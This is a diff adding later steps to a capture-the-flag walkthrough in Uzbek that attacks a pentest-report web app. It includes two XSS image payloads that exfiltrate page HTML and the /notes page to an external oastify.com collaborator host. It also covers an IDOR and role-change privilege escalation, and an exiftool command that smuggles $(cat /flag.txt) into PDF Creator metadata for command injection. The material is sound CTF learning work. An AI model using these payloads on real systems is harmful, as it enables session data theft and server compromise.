@@ -146,5 +146,81 @@ Aslida brute force qilishni keragi yo'q, demak platforma pentest reportlar saqla
 Lekin XSS orqali cookie ololmaymiz:
 ![image](https://github.com/user-attachments/assets/09ad1557-ab6b-4f4d-bf07-e58577511a14)
 
+14) Bu degani yoki yangi yo'l topishimiz kerak yoki XSS ni boshqa zaiflik bilan chain qilish kerak, oldingi logic bo'yicha har bitta yangi userda yangi feature bor, demak hozir XSS payload ishga tushirib beryotgan bot keyingi user sessiyasidan foydalansa, yangi featurelarni tekshirib ko'rish kerak:
 
+```
+<img src=invalid onerror="
+  this.onerror=null;
+  var html = document.documentElement.outerHTML;
+  var utf8 = unescape(encodeURIComponent(html));
+  var b64  = btoa(utf8);
+  this.src='https://604dlgcye7llwrdmtsoqmnbl0c63uumib.oastify.com/?d='+encodeURIComponent(b64)
+" style="display:none">
+```
+
+Bu kod DOM ichida contentlarni oladi:
+![image](https://github.com/user-attachments/assets/66266a5b-b9be-430c-b23d-aaa031af04e1)
+
+Keyin base64 qilib umumiy contentni Burp collaboratorga jo'natadi:
+![image](https://github.com/user-attachments/assets/1ba4e9d5-f427-4d09-93de-189cc7f12a0d)
+
+Keyingi user sessiyasi uchun yana 2ta yangi feature borligini ko'rsak bo'ladi /notes va /users:
+![image](https://github.com/user-attachments/assets/356ce8f7-2356-4e75-aae2-d3716987fdca)
+
+15) Bizga ko'proq /notes sahifasi qiziqroq, page content base64 ko'rinishda keladi, birinchi script /notes page ni fetch yordamida oladi faqat .text ya'ni data qismini va bizga jo'natadi:
+```
+<img src=x onerror="
+  this.onerror=null;
+  fetch('/notes').then(r=>r.text()).then(code=>{
+    var b64 = btoa(unescape(encodeURIComponent(code)));
+    new Image().src='https://604dlgcye7llwrdmtsoqmnbl0c63uumib.oastify.com/?d='+encodeURIComponent(b64);
+  });
+" style="display:none">
+```
+Pageni o'zimiz ochib ko'ramiz:
+![image](https://github.com/user-attachments/assets/6cae8de6-2ffc-48e1-812d-b81a597e916b)
+
+parol:
+![image](https://github.com/user-attachments/assets/b64f1c2a-7ca7-4af0-8b9e-dc5b5b65efa5)
+
+16) Keyingi user aytilishi bo'yicha Team lead yangi teamlead1 user, user paroli bilan kirilganda /users degan yangi feature ko'rish mumkin, u orqali user rolelari o'zgartiriladi:
+
+![image](https://github.com/user-attachments/assets/828f33c9-bb5d-4fff-8a5c-56b9e598a82a)
+
+![image](https://github.com/user-attachments/assets/2f70bce0-e7e2-4bab-8b57-88b7fe87a07f)
+
+Lekin bizga faqat biz allaqachon olib bo'lgan 3ta user ko'rinadi, tizimda 4ta user bor, qiziq tomoni URLda /user/edit/1 path ko'rishimiz mumkin, IDORga o'xshaydi.. 
+
+Demak /user/edit/1 ni /user/edit/4 ga o'zgartirsak 4-user "mod1" huquqlarini o'zgartirsak bo'ladi:
+![image](https://github.com/user-attachments/assets/9fb4aeee-28ac-46b7-a3ea-bd2adb3fc163)
+
+Bizga buni foydasi yo'q, biz o'zimizni user huquqlarini oshirishimiz kerak.
+
+17) Role update qilish so'rovini o'zgartirib ko'rsak, 3-user hozirgi user uchun moderator roleini bersak bo'lishini ko'rsak bo'ladi:
+
+![image](https://github.com/user-attachments/assets/c010af15-0d22-4bc2-84a5-883f7bd85bab)
+
+Priv esc o'xshadi! Yana 2ta yangi feature qo'shildi:
+![image](https://github.com/user-attachments/assets/ee1615b3-e9d7-47d0-94be-597819ef74b7)
+
+Backup orqali tizim kodlarini ko'rsak bo'ladi:
+![image](https://github.com/user-attachments/assets/ceb9e19b-c16c-470e-bab6-9143a7ff7659)
+
+Kodda qiziqroq login-parol yoki etc narsalar yo'q, endi PDF validate featureni tekshirib ko'ramiz:
+![image](https://github.com/user-attachments/assets/3ebb3499-120d-44f9-bcf0-058376bacce0)
+
+Kodga ko'ra PDF validate PDF faylni userdan oladi va metadatani tekshirib Creator nomli Metadatani "sh" shellga to'g'ridan-to'g'ri o'tkizadi, demak bu yerda Command injection bor..
+![image](https://github.com/user-attachments/assets/2aabee4f-2463-47bc-9d8f-64f6e30a3160)
+
+18) PDF metadata uchun Creatorga shell command joylashtiramiz:
+
+```
+exiftool -Creator='$(cat /flag.txt)' 0x01_Intro.pdf
+```
+
+![image](https://github.com/user-attachments/assets/aacc02fe-4c5f-4af1-a1a0-93592418e8cf)
+
+19) PDFni upload qilamiz va flagni olamiz:
+
+![image](https://github.com/user-attachments/assets/eb81100b-56b9-42cb-aefd-42eefd8fdc8c)
 
